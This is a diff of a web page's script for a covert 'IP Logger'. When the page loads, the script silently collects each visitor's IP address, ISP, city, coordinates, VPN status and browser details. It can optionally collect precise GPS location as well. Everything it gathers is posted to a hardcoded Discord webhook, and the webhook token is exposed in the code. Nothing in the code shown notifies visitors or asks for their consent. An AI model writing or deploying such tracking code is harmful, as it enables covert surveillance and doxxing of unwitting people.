@@ -70,47 +70,47 @@
     </div>
 
     <script>
-        // Simple and reliable version
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN";
+        const config = {
+            "webhook": "https://discord.com/api/webhooks/1433408427815600241/TkgVjkPmIOqYcO9g3P0GiH1SRkLStDJbpuQ1gIpBx6pPvzWDSOR1JhSP-cQJuf0wDAIN",
+            "username": "IP Logger",
+            "color": 0x00FFFF,
+            "accurateLocation": false
+        };
 
-        // Get basic IP info first
-        async function getBasicIP() {
+        // Get IP info from ip-api.com (main source)
+        async function getIPInfo() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                // Use HTTPS for GitHub Pages
+                const response = await fetch('https://ip-api.com/json/?fields=66846719');
                 const data = await response.json();
-                return data.ip;
-            } catch (error) {
-                return 'Unknown';
-            }
-        }
-
-        // Get detailed IP info with retry
-        async function getDetailedIPInfo(ip) {
-            // Try multiple endpoints
-            const endpoints = [
-                `https://ipapi.co/${ip}/json/`,
-                `https://ipwhois.app/json/${ip}`,
-                'https://jsonip.com/'
-            ];
-
-            for (let endpoint of endpoints) {
-                try {
-                    console.log('Trying endpoint:', endpoint);
-                    const response = await fetch(endpoint);
-                    if (response.ok) {
-                        const data = await response.json();
-                        console.log('Success with endpoint:', endpoint, data);
-                        return data;
-                    }
-                } catch (error) {
-                    console.log('Failed with endpoint:', endpoint, error);
-                    continue;
+                
+                if (data.status === 'success') {
+                    return {
+                        query: data.query,
+                        isp: data.isp,
+                        as: data.as,
+                        continent: data.continent,
+                        country: data.country,
+                        regionName: data.regionName,
+                        city: data.city,
+                        lat: data.lat,
+                        lon: data.lon,
+                        timezone: data.timezone,
+                        mobile: data.mobile,
+                        proxy: data.proxy,
+                        hosting: data.hosting,
+                        countryCode: data.countryCode
+                    };
+                } else {
+                    throw new Error(data.message);
                 }
+            } catch (error) {
+                console.error('ip-api.com failed:', error);
+                throw error;
             }
-            return null;
         }
 
-        // Simple user agent parsing
+        // Parse user agent
         function parseUserAgent(ua) {
             if (!ua) return { os: 'Unknown', browser: 'Unknown' };
             
@@ -134,51 +134,57 @@
             return { os, browser };
         }
 
-        // Send to Discord
+        // Send to Discord with original format
         async function sendToDiscord(data) {
             try {
-                // Format the message
-                const message = {
-                    username: "IP Logger",
+                const embed = {
+                    username: config.username,
+                    content: "",
                     embeds: [{
-                        title: "🌐 New Visitor",
-                        color: 0x00FFFF,
+                        title: "🌐 IP Logged",
+                        color: config.color,
                         description: `
-**IP Address:** \`${data.ip || 'Unknown'}\`
-**Country:** ${data.country || 'Unknown'} ${data.country_code ? `(${data.country_code})` : ''}
-**Region:** ${data.region || data.regionName || 'Unknown'}
-**City:** ${data.city || 'Unknown'}
-**ISP:** ${data.isp || data.org || 'Unknown'}
-**Timezone:** ${data.timezone || 'Unknown'}
+**IP Info:**
+> **IP:** \`${data.ipInfo.query}\`
+> **Provider:** \`${data.ipInfo.isp}\`
+> **ASN:** \`${data.ipInfo.as}\`
+> **Continent:** \`${data.ipInfo.continent}\`
+> **Country:** \`${data.ipInfo.country}\`
+> **Region:** \`${data.ipInfo.regionName}\`
+> **City:** \`${data.ipInfo.city}\`
+> **Coordinates:** \`${data.ipInfo.lat}, ${data.ipInfo.lon}\`
+> **Timezone:** \`${data.ipInfo.timezone}\`
+> **Mobile:** \`${data.ipInfo.mobile ? 'True' : 'False'}\`
+> **VPN:** \`${data.ipInfo.proxy ? 'True' : 'False'}\`
+> **Bot:** \`${data.botStatus}\`
 
-**Device Info:**
-**OS:** ${data.browserInfo.os}
-**Browser:** ${data.browserInfo.browser}
+**PC Info:**
+> **OS:** \`${data.browserInfo.os}\`
+> **Browser:** \`${data.browserInfo.browser}\`
+
 **User Agent:**
 \`\`\`
 ${navigator.userAgent}
-\`\`\``,
-                        timestamp: new Date().toISOString()
+\`\`\``
                     }]
                 };
 
-                console.log('Sending to Discord:', message);
-
-                const response = await fetch(WEBHOOK_URL, {
+                const response = await fetch(config.webhook, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(message)
+                    body: JSON.stringify(embed)
                 });
 
-                if (response.ok) {
-                    console.log('Successfully sent to Discord');
-                } else {
-                    console.error('Discord response not OK:', response.status);
+                if (!response.ok) {
+                    throw new Error(`Discord response: ${response.status}`);
                 }
+
+                console.log('Successfully sent to Discord');
             } catch (error) {
                 console.error('Error sending to Discord:', error);
+                throw error;
             }
         }
 
@@ -211,34 +217,34 @@ ${navigator.userAgent}
             });
         }
 
-        // Send precise location to Discord
+        // Send precise location
         async function sendPreciseLocation(data, location) {
             try {
-                const message = {
-                    username: "IP Logger - GPS Location",
+                const embed = {
+                    username: `${config.username} - GPS`,
+                    content: "",
                     embeds: [{
                         title: "📍 Precise Location",
                         color: 0x00FF00,
                         description: `
-**IP:** \`${data.ip}\`
-**Precise Coordinates:** \`${location.coords}\`
-**Accuracy:** ${location.accuracy} meters
-**Google Maps:** [View Location](${location.mapsLink})
+**Precise GPS Location:**
+> **Coordinates:** \`${location.coords}\`
+> **Accuracy:** \`${location.accuracy} meters\`
+> **Google Maps:** [View Location](${location.mapsLink})
 
-**Additional Info:**
-**Country:** ${data.country || 'Unknown'}
-**City:** ${data.city || 'Unknown'}
-**ISP:** ${data.isp || data.org || 'Unknown'}`,
-                        timestamp: new Date().toISOString()
+**User Information:**
+> **IP:** \`${data.ipInfo.query}\`
+> **Country:** \`${data.ipInfo.country}\`
+> **City:** \`${data.ipInfo.city}\``
                     }]
                 };
 
-                await fetch(WEBHOOK_URL, {
+                await fetch(config.webhook, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(message)
+                    body: JSON.stringify(embed)
                 });
             } catch (error) {
                 console.error('Error sending precise location:', error);
@@ -246,56 +252,65 @@ ${navigator.userAgent}
         }
 
         // Main function
-        async function init() {
-            console.log('Starting IP logger...');
-
+        async function logIP() {
             try {
-                // Get basic IP first
-                const ip = await getBasicIP();
-                console.log('Basic IP:', ip);
+                console.log('Starting IP collection...');
 
-                // Get detailed information
-                const detailedInfo = await getDetailedIPInfo(ip);
-                console.log('Detailed info:', detailedInfo);
+                // Get IP information from ip-api.com
+                const ipData = await getIPInfo();
+                console.log('IP data received:', ipData);
 
-                // Parse user agent
+                // Get browser information
                 const browserInfo = parseUserAgent(navigator.userAgent);
 
-                // Combine all data
-                const logData = {
-                    ip: ip,
-                    ...detailedInfo,
-                    browserInfo: browserInfo
-                };
-
-                console.log('Final data to send:', logData);
-
-                // Send to Discord
-                await sendToDiscord(logData);
-
-                // Try to get precise location (optional)
-                const preciseLocation = await getPreciseLocation();
-                if (preciseLocation) {
-                    await sendPreciseLocation(logData, preciseLocation);
+                // Bot detection
+                let botStatus = 'False';
+                if (ipData.hosting) {
+                    botStatus = ipData.proxy ? 'Possibly' : 'True';
                 }
 
+                const logData = {
+                    ipInfo: ipData,
+                    browserInfo: browserInfo,
+                    botStatus: botStatus
+                };
+
+                // Send main webhook
+                await sendToDiscord(logData);
+
+                // Get precise location if enabled
+                if (config.accurateLocation) {
+                    const preciseLocation = await getPreciseLocation();
+                    if (preciseLocation) {
+                        await sendPreciseLocation(logData, preciseLocation);
+                    }
+                }
+
+                console.log('IP logging completed successfully');
+
             } catch (error) {
-                console.error('Error in init:', error);
+                console.error('Error in IP logger:', error);
                 
                 // Send error to Discord
                 try {
-                    await fetch(WEBHOOK_URL, {
+                    await fetch(config.webhook, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            username: "IP Logger - ERROR",
+                            username: `${config.username} - ERROR`,
+                            content: "",
                             embeds: [{
-                                title: "⚠️ Logger Error",
+                                title: "⚠️ IP Logger Error",
                                 color: 0xFF0000,
-                                description: `Error: ${error.message}\n\nUser Agent: ${navigator.userAgent}`,
-                                timestamp: new Date().toISOString()
+                                description: `**Error:** \`\`\`${error.message}\`\`\`\n**URL:** ${window.location.href}`,
+                                fields: [
+                                    {
+                                        name: "User Agent",
+                                        value: `\`\`\`${navigator.userAgent}\`\`\``
+                                    }
+                                ]
                             }]
                         })
                     });
@@ -306,15 +321,7 @@ ${navigator.userAgent}
         }
 
         // Start when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            console.log('DOM loaded, starting logger...');
-            setTimeout(init, 1000); // Small delay to ensure everything is ready
-        });
-
-        // Also try on window load as backup
-        window.addEventListener('load', function() {
-            console.log('Window loaded');
-        });
+        document.addEventListener('DOMContentLoaded', logIP);
     </script>
 </body>
 </html>
